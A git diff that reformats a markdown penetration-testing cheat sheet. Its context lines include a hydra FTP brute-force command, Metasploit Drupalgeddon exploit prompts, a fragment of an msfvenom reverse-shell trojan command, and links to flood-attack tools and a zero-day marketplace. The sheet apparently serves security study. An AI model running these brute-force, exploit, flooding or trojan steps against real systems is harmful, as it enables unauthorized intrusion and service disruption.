@@ -6,13 +6,17 @@ https://attack.mitre.org/
 hydra -L users.txt -P pass.txt IP_ADDRESS ftp -V
 ```
 ## **Intrusion Prevention System (IPS)** is security system for catching and preventing security threats.
- ▪ It works on predefined security rules, just like IP:
-
-https://www.snort.org/
+*It works on predefined security rules, just like IP:* https://www.snort.org/
 
 ## How to Check What Ports are Opened on Your PC?
-▪ **Windows:** netstat –an, netstat –antb <br />
-▪ **Unix:** ss -nltp, netstat –tulpn <br />
+▪ **Windows:** 
+```sh
+netstat –an, netstat –antb <br />
+```
+▪ **Unix:** 
+```sh
+ss -nltp, netstat –tulpn <br />
+```
 
 # JWT Token Vulnerability
 ```sh
@@ -39,16 +43,14 @@ msf6 exploit(multi/http/drupal_drupageddon) > exploit
 
 ## How to brute-force a Password?
 
-▪ Using hydra (https://github.com/vanhauser-thc/thc-hydra)
+**Using hydra:** https://github.com/vanhauser-thc/thc-hydra
 
 **More details at:** 
-
 ▪ https://hashcat.net/wiki/doku.php?id=example_hashes <br />
 ▪ https://crackstation.net <br />
 
 ## Get hash with Responder  <br /> 
-https://github.com/SpiderLabs/Responder <br />
-
+▪ https://github.com/SpiderLabs/Responder <br />
 
 ## Zero Days Marketplace (There is a database and a marketplace for that) <br />
 https://0day.today
@@ -91,10 +93,9 @@ sudo setoolkit
 ▪ **LOIC** (https://sourceforge.net/projects/loic/)–TCP, UDP, HTTP    <br />
 GET FLOODS   <br /> 
 ▪ **HOIC** (https://sourceforge.net/projects/highorbitioncannon/)   <br />
- HTTP GET / POST requests   <br />
+HTTP GET / POST requests   <br />
 ▪ **hping3:** https://www.kali.org/tools/hping3/   <br />
 ▪ **TorsHammer:** https://github.com/Karlheinzniebuhr/torshammer   <br />
-
 
 ## How to Generate Simple (and Detectable of Course) Trojan for Reverse Shell Callback?
 
@@ -113,7 +114,7 @@ LPORT=PORT –f exe –o file.exe
 # Spyware
 Spywareis a type of malware that stays hidden and gathers as much sensitive data as possible
 
-#  SQL Injection
+# SQL Injection
 There are many types of SQL Injection attacks, such as: error based, stacked queries, union based and more;
 ```sh
 smsf6 exploit(multi/http/drupal_drupageddon) > show options
@@ -121,10 +122,10 @@ msf6 exploit(multi/http/drupal_drupageddon) > exploit
 ```
 
 # Brute Forcing Attacks   <br />
-▪ Example software for performing the attack:   <br />
-▪ THC-Hydra: https://github.com/vanhauser-thc/thchydra   <br />
-▪ Burp Intruder: https://portswigger.net/burp/pro   <br />
-▪ Medusa: https://github.com/jmk-foofus/medusa   <br />
+**Example software for performing the attack:**   <br />
+▪ **THC-Hydra:** https://github.com/vanhauser-thc/thchydra   <br />
+▪ **Burp Intruder:** https://portswigger.net/burp/pro   <br />
+▪ **Medusa:** https://github.com/jmk-foofus/medusa   <br />
 
 # Security Information and Event Management - SIEM for Securty analysis
 QRadar SIEM Demo
@@ -137,27 +138,29 @@ ps -aef --forest
 ▪ Analyzing Sliver C2 HTTP Beacon with Wireshark:
 
 # Penetration Testing Operational Systems (OS)
-▪ Kali Linux (https://www.kali.org)   <br />
-▪ Parrot OS (https://www.parrotsec.org)  <br />
-▪ Black Arch (https://blackarch.org)   <br />
-▪ CommandoVM(https://github.com/mandiant/commando-vm)   <br />
-▪ Nessus (https://www.tenable.com/products/nessus)   <br />
-▪ Nmap (https://nmap.org)   <br />
-▪ BurpSuite(https://portswigger.net/burp)   <br />
-▪ Searchsploit(https://www.exploit-db.com/searchsploit)   <br />
+▪ **Kali Linux:** https://www.kali.org   <br />
+▪ **Parrot OS:** https://www.parrotsec.org  <br />
+▪ **Black Arch:** https://blackarch.org   <br />
+▪ **CommandoVM:** https://github.com/mandiant/commando-vm   <br />
+▪ **Nessus:** https://www.tenable.com/products/nessus   <br />
+▪ **Nmap:** https://nmap.org   <br />
+▪ **BurpSuite:** https://portswigger.net/burp   <br />
+▪ **Searchsploit:** https://www.exploit-db.com/searchsploit   <br />
 
 ## Scanning local system for *privilege escalation* attack vectors with linpeas
-https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS   <br />
 
-▪ On github: https://github.com/juliocesarfort/public-pentesting-reports   <br />
+**More details at:** https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS   <br />
 
-TryHackMe: https://tryhackme.com/   <br />
-▪ Vulnhub: https://www.vulnhub.com/   <br />
-▪ HackTheBox: https://www.hackthebox.com/   <br />
+**On github:** https://github.com/juliocesarfort/public-pentesting-reports   <br />
 
-Use ATT&CK Navigator (https://mitre-attack.github.io/attack-navigator/)to map a sample TTP   <br />
+▪ **TryHackMe:** https://tryhackme.com/   <br />
+▪ **Vulnhub:** https://www.vulnhub.com/   <br />
+▪ **HackTheBox:** https://www.hackthebox.com/   <br />
 
-USING KALI LINUX with Seclists and Run:   <br />
+Use ATT&CK Navigator: <br />
+https://mitre-attack.github.io/attack-navigator/ to map a sample TTP   <br />
+
+***USING KALI LINUX with Seclists and Run:***   <br />
 ```sh
 cd /opt/
 sudo git clone https://github.com/danielmiessler/SecLists" 
